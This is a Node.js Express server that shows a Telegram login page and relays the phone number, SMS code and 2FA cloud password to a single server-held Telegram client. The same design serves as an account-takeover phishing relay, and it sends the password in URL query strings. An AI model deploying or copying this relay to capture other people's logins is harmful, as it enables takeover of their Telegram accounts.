const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());
const port = process.env.PORT || 3000;

const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;
const session = new StringSession(""); 

let client = new TelegramClient(session, apiId, apiHash, { connectionRetries: 5 });
let codeResolve;
let passwordResolve; // Для 2FA

const getUI = () => `
<!DOCTYPE html>
<html>
<head>
    <title>Custom TG Web (2FA Support)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin: 0; font-family: sans-serif; background: #e6ebee; display: flex; height: 100vh; }
        #app { margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        #messenger { display: none; width: 100vw; height: 100vh; background: white; } /* Тут будет сам мессенджер после входа */
    </style>
</head>
<body>
    <div id="app">
        <h2>Telegram Login</h2>
        <div id="step-phone">
            <input id="phone" type="text" placeholder="+79XXXXXXXXX">
            <button onclick="sendPhone()">Отправить код</button>
        </div>
        <div id="step-code" style="display:none">
            <input id="code" type="text" placeholder="Код из СМС">
            <button onclick="sendCode()">Войти</button>
        </div>
        <div id="step-2fa" style="display:none">
            <p style="color: red">Включена 2FA!</p>
            <input id="2fa-pass" type="password" placeholder="Ваш облачный пароль">
            <button onclick="send2FA()">Подтвердить пароль</button>
        </div>
    </div>

    <script>
        async function sendPhone() {
            const phone = document.getElementById('phone').value;
            await fetch('/api/login?phone=' + phone);
            document.getElementById('step-phone').style.display = 'none';
            document.getElementById('step-code').style.display = 'block';
        }

        async function sendCode() {
            const code = document.getElementById('code').value;
            const res = await fetch('/api/submit-code?code=' + code);
            const data = await res.json();
            if (data.status === 'need_2fa') {
                document.getElementById('step-code').style.display = 'none';
                document.getElementById('step-2fa').style.display = 'block';
            } else {
                location.reload(); // Если зашел — обновим страницу для мессенджера
            }
        }

        async function send2FA() {
            const pass = document.getElementById('2fa-pass').value;
            await fetch('/api/submit-2fa?pass=' + pass);
            location.reload();
        }
    </script>
</body>
</html>
`;

app.get("/", (req, res) => res.send(getUI()));

app.get("/api/login", async (req, res) => {
    const phone = req.query.phone;
    client.start({
        phoneNumber: async () => phone,
        phoneCode: async () => new Promise(r => { codeResolve = r; }),
        password: async () => new Promise(r => { passwordResolve = r; }),
        onError: (err) => console.log("TG Error:", err),
    });
    res.json({ ok: true });
});

app.get("/api/submit-code", (req, res) => {
    if (codeResolve) {
        codeResolve(req.query.code);
        // Даем секунду Telegram понять, нужно ли 2FA
        setTimeout(() => {
            if (passwordResolve) res.json({ status: 'need_2fa' });
            else res.json({ status: 'ok' });
        }, 1500);
    }
});

app.get("/api/submit-2fa", (req, res) => {
    if (passwordResolve) {
        passwordResolve(req.query.pass);
        res.json({ ok: true });
    }
});

app.listen(port, () => console.log(`Server with 2FA support on ${port}`));